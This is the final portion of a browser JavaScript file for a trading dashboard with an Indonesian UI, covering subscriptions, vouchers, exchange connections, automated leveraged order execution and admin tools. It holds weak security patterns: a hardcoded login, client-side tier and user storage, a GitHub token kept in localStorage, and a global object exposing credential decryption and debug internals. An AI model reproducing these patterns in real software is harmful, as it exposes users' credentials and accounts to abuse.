            window.switchAuthModalTab('login');
            return;
        }
        currentUser.tier = tier;
        currentUser.expiresAt = new Date(Date.now() + 86400000 * 30).toISOString().slice(0, 10);
        const users = loadUsersRegistry();
        const idx = users.findIndex(u => u.email.toLowerCase() === currentUser.email.toLowerCase());
        if (idx !== -1) users[idx] = currentUser;
        saveUsersRegistry(users);
        setActiveSession(currentUser);
        adminLogEvent('SUBSCRIPTION_UPGRADE', `${currentUser.email} mengaktifkan paket ${tier}`);
        window.closeAuthModal();
        if (typeof showToast === 'function') showToast(`Paket ${tier} berhasil diaktifkan untuk ${currentUser.email}!`, 'ok');
    };
    window.redeemSubscriptionVoucher = function () {
        const code = ($('pfRedeemVoucherInput')?.value || '').trim().toUpperCase();
        if (detectAndBlockAttack(code, 'RedeemVoucher').blocked) return;
        const v = (adminConfig.vouchers || []).find(x => x.code === code && x.usesLeft > 0);
        if (!v) {
            if (typeof showToast === 'function') showToast('Kode voucher tidak ditemukan atau sudah habis', 'err');
            return;
        }
        v.usesLeft--;
        saveAdminConfig();
        if (!currentUser) loginWithEmail('vip.trader@gmail.com', 'vip123');
        window.activateUserSubscription(v.tier);
    };
    window.dismissSysBanner = function () {
        const b = $('pfSystemAnnouncementBanner');
        if (b) b.classList.remove('active');
    };

    window.filterExchangeCards = function (cat) {
        currentExchangeFilter = cat;
        ['ALL', 'CRYPTO_ID', 'CRYPTO_INTL', 'FOREX_ID', 'STOCK_FOREX_INTL'].forEach(c => {
            const btn = $('exCatBtn-' + c);
            if (btn) btn.classList.toggle('active', c === cat);
        });
        renderExchangeCardsGrid();
    };
    window.selectExchangeCard = selectExchangeCard;
    window.saveAndConnectExchange = saveAndConnectExchange;
    window.disconnectSelectedExchange = disconnectSelectedExchange;
    window.syncAllConnectedExchanges = function () {
        const connected = getConnectedExchangesList();
        if (!connected.length) {
            saveAndConnectExchange();
            return;
        }
        renderExchangeGatewayUI();
        recalcQuantProfitPlan();
        if (typeof showToast === 'function') showToast(`Live saldo dari ${connected.length} bursa tersinkronisasi!`, 'ok');
    };
    window.executeQuantSignalOnSelectedExchange = async function () {
        if (!userExchangeConfigs[selectedExchangeId] || !userExchangeConfigs[selectedExchangeId].connected) {
            await saveAndConnectExchange();
        }
        const topSig = brain.signals[0] || { sym: 'BTCUSDT', side: 'LONG', entry: getLivePriceForSymbol('BTCUSDT'), volPct: 1.25, lev: 5 };
        const pos = await executeSignalOnExchange(selectedExchangeId, topSig);
        if (pos && typeof showToast === 'function') {
            showToast(`Order ${pos.side} ${pos.sym} ($${pos.notionalUsd}) dieksekusi di ${pos.exName} dengan SL & TP3 otomatis!`, 'ok');
        }
    };
    window.executeSignalByIndexOnExchange = async function (idx) {
        const sig = brain.signals[idx];
        if (!sig) return;
        const conn = getConnectedExchangesList();
        const targetExId = conn.length ? conn[0].id : selectedExchangeId;
        if (!userExchangeConfigs[targetExId] || !userExchangeConfigs[targetExId].connected) {
            selectedExchangeId = targetExId;
            await saveAndConnectExchange();
        }
        const pos = await executeSignalOnExchange(targetExId, sig);
        if (pos && typeof showToast === 'function') {
            showToast(`Sinyal A+ ${sig.sym} (${sig.side}) dieksekusi ke ${pos.exName}!`, 'ok');
        }
    };
    window.executeBestQuantAcrossAllConnected = async function () {
        let conn = getConnectedExchangesList();
        if (!conn.length) {
            await saveAndConnectExchange();
            conn = getConnectedExchangesList();
        }
        const topSig = brain.signals[0] || { sym: 'BTCUSDT', side: 'LONG', entry: getLivePriceForSymbol('BTCUSDT'), volPct: 1.2, lev: 5 };
        for (const ex of conn) {
            await executeSignalOnExchange(ex.id, topSig);
        }
        if (typeof showToast === 'function') showToast(`Sinyal terbaik dieksekusi serentak ke ${conn.length} bursa terhubung!`, 'ok');
    };
    window.closeLiveExchangePosition = closeLiveExchangePosition;
    window.toggleQuantAutoExecution = function () {
        brain.autoExecBursa = !brain.autoExecBursa;
        saveBrain();
        qbRenderStats();
        if (typeof showToast === 'function') {
            showToast(brain.autoExecBursa ? 'AUTO-EXEC BURSA AKTIF: Sinyal A+ akan dieksekusi otomatis sesuai Money Management!' : 'Auto-Exec Bursa dinonaktifkan (Mode Manual).', 'ok');
        }
    };
    window.qbForceEvolutionaryStep = qbForceEvolutionaryStep;
    window.runLivePenetrationAudit = runLivePenetrationAudit;

    window.onProfitPlanSourceChange = function (val) {
        const capInp = $('ppInitialCapitalUsd');
        if (val !== 'CUSTOM') {
            const liveSum = getTotalConnectedBalanceUsd(val);
            if (capInp) capInp.value = liveSum > 0 ? Math.round(liveSum) : 1000;
        }
        recalcQuantProfitPlan();
    };
    window.syncProfitPlanFromExchanges = function () {
        const sel = $('ppCapitalSourceSel');
        if (sel) sel.value = 'ALL_EXCHANGES';
        const liveSum = getTotalConnectedBalanceUsd('ALL_EXCHANGES');
        const capInp = $('ppInitialCapitalUsd');
        if (capInp && liveSum > 0) capInp.value = Math.round(liveSum);
        recalcQuantProfitPlan();
        if (typeof showToast === 'function') {
            showToast(liveSum > 0 ? `Modal Profit Plan disinkronkan ke Live Saldo Bursa: $${liveSum.toLocaleString('en-US')}` : 'Hubungkan bursa terlebih dahulu atau gunakan modal custom.', 'ok');
        }
    };
    window.recalcQuantProfitPlan = recalcQuantProfitPlan;
    window.applyProfitPlanToOmsAndExchanges = function () {
        const plan = recalcQuantProfitPlan();
        brain.params.riskPct = plan.riskPct;
        saveBrain();
        const omsMarginInp = document.getElementById('omsMarginUsd');
        const omsLevInp = document.getElementById('omsLeverage');
        const omsLevLbl = document.getElementById('omsLevLabel');
        if (omsMarginInp) omsMarginInp.value = Math.round(plan.marginUsd);
        if (omsLevInp) omsLevInp.value = plan.recLeverage;
        if (omsLevLbl) omsLevLbl.textContent = plan.recLeverage + 'x';
        if (typeof window.updateOmsTicketPreview === 'function') window.updateOmsTicketPreview();
        qbRenderStats();
        qbRenderParams();
        if (typeof showToast === 'function') {
            showToast(`Blueprint diterapkan: Entry ${plan.entryPctOfModal.toFixed(1)}% Modal ($${plan.marginUsd.toFixed(0)}), Leverage ${plan.recLeverage}x, SL -${plan.slDistancePct.toFixed(2)}%`, 'ok');
        }
    };
    window.exportProfitPlanCSV = function () {
        const plan = recalcQuantProfitPlan();
        let csv = 'Horizon,Days,StartCapitalUSD,EstTrades,ConservativeProfitPct,ChampionProfitPct,ChampionProfitUSD,ProjectedEndBalanceUSD,MaxDrawdownCapPct\n';
        plan.rows.forEach(r => {
            csv += `"${r.label}",${r.days},${r.startCapUsd},${r.trades},${r.consProfitPct.toFixed(2)}%,${r.champProfitPct.toFixed(2)}%,${r.champProfitUsd.toFixed(2)},${r.endCapUsd.toFixed(2)},-${r.maxDdPct.toFixed(2)}%\n`;
        });
        if (typeof window.downloadFile === 'function') {
            window.downloadFile(csv, 'pilusfinance_quant_profit_plan.csv', 'text/csv');
        }
        if (typeof showToast === 'function') showToast('Tabel Rencana & Target Profit diekspor ke CSV', 'ok');
    };

    window.adminAddOrUpdateUser = adminAddOrUpdateUser;
    window.adminCycleUserTier = adminCycleUserTier;
    window.adminExtendUserSub = adminExtendUserSub;
    window.adminToggleSuspendUser = adminToggleSuspendUser;
    window.adminSaveMonetizationConfig = adminSaveMonetizationConfig;
    window.adminCreateVoucher = adminCreateVoucher;
    window.adminToggleGlobalKillSwitch = adminToggleGlobalKillSwitch;
    window.adminApplyQuantParams = adminApplyQuantParams;
    window.adminPublishBroadcast = adminPublishBroadcast;
    window.adminSaveGithubToken = function (val) {
        try { localStorage.setItem(QB_GITHUB_TOKEN_KEY, (val || '').trim()); } catch (e) { }
        adminLogEvent('GITHUB_PAT', 'GitHub Sync PAT diperbarui');
        if (typeof showToast === 'function') showToast('GitHub Database Token disimpan', 'ok');
    };
    window.adminClearAuditLog = function () {
        adminConfig.auditLog = [];
        saveAdminConfig();
        renderAdminAuditLog();
    };
    window.adminExportSubscribersCSV = function () {
        if (!isCurrentUserAdmin()) return;
        const users = loadUsersRegistry();
        let csv = 'UID,Name,Email,Provider,Role,Tier,Status,ExpiresAt\n';
        users.forEach(u => {
            csv += `${u.uid},"${u.name}",${u.email},${u.provider},${u.role},${u.tier},${u.status},${u.expiresAt}\n`;
        });
        if (typeof window.downloadFile === 'function') window.downloadFile(csv, 'pilusfinance_subscribers_crm.csv', 'text/csv');
        if (typeof showToast === 'function') showToast('Data Subscriber diekspor ke CSV', 'ok');
    };

    window.closeQbResetModal = closeQbResetModal;
    window.confirmQbResetExecute = confirmQbResetExecute;

    /* ═══════════════ 17. BOOTSTRAP ═══════════════ */
    function boot() {
        brain = loadBrain();
        loadAdminConfig();
        verifyOriginAndAntiClone();
        qbGithubLoad().catch(() => {});
        if (!brain.journal.length) {
            qbJournal('SYS', '[QUANT BRAIN v2.5] Online — 18 sumber pengetahuan institusional, Kalman Filter, Hurst Fractal, Bayesian Matrix, & AES-256-GCM Security Shield aktif.');
        }

        try {
            const savedSess = localStorage.getItem(AUTH_SESSION_KEY);
            if (savedSess) {
                const parsedSess = safeJsonParse(savedSess, null);
                if (parsedSess && verifySessionIntegrity(parsedSess)) {
                    currentUser = parsedSess;
                } else {
                    localStorage.removeItem(AUTH_SESSION_KEY);
                }
            }
        } catch (e) { }
        loadCurrentUserWorkstate();
        // Muat Firebase Auth lebih awal: memulihkan sesi Google (termasuk admin) & menyiapkan popup tanpa delay.
        if (canUseFirebaseAuth()) initFirebaseAuth().catch(() => { });

        const b1 = $('qbBtnStart'); if (b1) b1.addEventListener('click', qbToggleRun);
        const b2 = $('qbBtnScan'); if (b2) b2.addEventListener('click', qbManualScan);
        const b3 = $('qbBtnReset'); if (b3) b3.addEventListener('click', openQbResetModal);
        const b4 = $('qbBtnExport'); if (b4) b4.addEventListener('click', qbExport);
        const b5 = $('qbBtnImport'); if (b5) b5.addEventListener('click', () => $('qbImportFile') && $('qbImportFile').click());
        const fi = $('qbImportFile'); if (fi) fi.addEventListener('change', e => { qbImportFile(e.target.files && e.target.files[0]); e.target.value = ''; });

        if (typeof window.addEventListener === 'function') window.addEventListener('resize', () => {
            qbDrawAccChart();
            recalcQuantProfitPlan();
            renderAllCanvasIcons();
        });

        renderAuthAndAdminUI();
        selectExchangeCard('binance');
        renderExchangeGatewayUI();
        qbRenderAll();
        recalcQuantProfitPlan();
        runLivePenetrationAudit().catch(() => {});

        qbSetStatus(brain.running ? 'AUTO-LEARNING AKTIF' : 'IDLE — klik START', brain.running ? 'on' : 'off');
        if (typeof document !== 'undefined' && document.getElementById('quant-brain-section')) {
            if (brain.running) {
                nextCycleAt = Date.now() + 1000;
                cycleTimer = setInterval(() => { if (Date.now() >= nextCycleAt) qbBrainCycle(); }, 5000);
                tickTimer = setInterval(() => { qbRenderStats(); renderLiveExchangePositions(); }, 1000);
                setTimeout(() => qbBrainCycle(), 600);
            } else {
                tickTimer = setInterval(() => { qbRenderStats(); renderLiveExchangePositions(); }, 3000);
            }
            cogTimer = setInterval(stepCognitiveStream, 4500);
            // 24/7 Background Web Worker & Visibility Catch-Up Bridge
            try {
                if (typeof Blob !== 'undefined' && typeof Worker !== 'undefined' && typeof URL !== 'undefined' && URL.createObjectURL) {
                    const wCode = "setInterval(function(){ postMessage('TICK_24X7'); }, 60000);";
                    const wBlob = new Blob([wCode], { type: 'application/javascript' });
                    const bgWorker = new Worker(URL.createObjectURL(wBlob));
                    bgWorker.onmessage = function () {
                        if (brain.running && Date.now() >= nextCycleAt) qbBrainCycle();
                    };
                }
                if (typeof document.addEventListener === 'function') {
                    document.addEventListener('visibilitychange', function () {
                        if (!document.hidden && brain.running) {
                            Promise.all([qbGithubLoad(), qbFirebaseLoad()]).then(function () {
                                if (Date.now() >= nextCycleAt) qbBrainCycle();
                                else qbRenderAll();
                            }).catch(function () {});
                        }
                    });
                }
            } catch (e) {}
        }
    }

    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
    else boot();

    window.PilusQuantBrain = {
        scan: qbManualScan,
        cycle: qbBrainCycle,
        evolve: qbForceEvolutionaryStep,
        state: () => brain,
        exportData: () => JSON.stringify({ exportedAt: new Date().toISOString(), version: brain.v, brain }),
        auth: {
            loginEmail: loginWithEmail,
            registerEmail: registerWithEmail,
            loginGoogle: startGoogleSignIn,
            logout: logoutCurrentUser,
            currentUser: () => currentUser,
            isAdmin: isCurrentUserAdmin,
            getUsers: loadUsersRegistry
        },
        exchanges: {
            catalog: EXCHANGE_CATALOG,
            connect: (exId, apiKey, secret, balUsd, extra) => connectExchangeSecure(exId, apiKey, secret, balUsd, extra, true),
            disconnect: (exId) => {
                const userScope = currentUser && currentUser.email ? currentUser.email.toLowerCase() : 'guest';
                privateMemoryVault.delete(userScope + '::' + exId);
                delete userExchangeConfigs[exId];
                saveCurrentUserWorkstate();
                renderExchangeGatewayUI();
            },
            getConnected: getConnectedExchangesList,
            getTotalBalanceUsd: getTotalConnectedBalanceUsd,
            executeSignalOnExchange,
            getPositions: () => liveExchangePositions,
            closePosition: closeLiveExchangePosition
        },
        profitPlan: {
            compute: computeProfitPlanData,
            recalc: recalcQuantProfitPlan,
            applyToOms: window.applyProfitPlanToOmsAndExchanges
        },
        security: {
            runPentest: runLivePenetrationAudit,
            detectAndBlockAttack,
            safeJsonParse,
            verifySessionIntegrity,
            verifyAndConsumeNonce,
            verifyOriginAndAntiClone,
            getDecryptedVaultCredential,
            telemetry: () => securityTelemetry
        },
        admin: {
            addOrUpdateUser: adminAddOrUpdateUser,
            createVoucher: adminCreateVoucher,
            toggleKillSwitch: adminToggleGlobalKillSwitch,
            getConfig: () => adminConfig
        },
        cloud: { syncGithub: qbGithubSyncAll, loadGithub: qbGithubLoad, syncFirebase: qbFirebaseSyncAll, loadFirebase: qbFirebaseLoad, projectId: QB_FIREBASE_PROJECT_ID, senderId: QB_FIREBASE_SENDER_ID },
        _dbg: { QB_EVAL, buildIndicators, detectRegime, computeMomentumBurst, computeVpinAndObi, aggEma, backtestStrategy, qbFetchBinanceDeep, qbWhaleCycle, computeHmacSignature, kalmanSeries, computeHurstExponent, qbStepPosition, qbOpenPosition, qbCostR, runLeg, recomputeChampionStrategy, qbPostMortem, qbRelaxLearnedParams, qbEvaluateOpenSignals }
    };
    })();
